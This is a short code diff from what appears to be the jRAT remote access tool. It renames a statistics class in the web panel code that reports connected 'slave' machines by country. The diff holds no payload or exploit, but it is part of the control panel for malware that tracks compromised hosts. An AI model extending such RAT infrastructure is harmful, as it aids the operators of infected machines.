@@ -11,8 +11,8 @@ import com.redpois0n.graphs.country.Country;
 import se.jrat.client.AbstractSlave;
 import se.jrat.client.Main;
 import se.jrat.client.exceptions.CloseException;
-import se.jrat.client.settings.Statistics;
-import se.jrat.client.settings.Statistics.StatEntry;
+import se.jrat.client.settings.CountryStatistics;
+import se.jrat.client.settings.CountryStatistics.CountryStatEntry;
 
 public class WebPanelConnection implements Runnable {
 
@@ -73,8 +73,8 @@ public class WebPanelConnection implements Runnable {
                 } else if (packet == WebPanelPackets.PACKET_LISTCOUNTRIES) {
                 	StringBuilder sb = new StringBuilder();
 
-                	for (int i = 0; i < Statistics.getGlobal().getList().size(); i++) {
-            			StatEntry entry = Statistics.getGlobal().getList().get(i);
+                	for (int i = 0; i < CountryStatistics.getGlobal().getList().size(); i++) {
+            			CountryStatEntry entry = CountryStatistics.getGlobal().getList().get(i);
             			try {
 
             				Country total = new Country(entry.getCountry(), entry.getConnects());
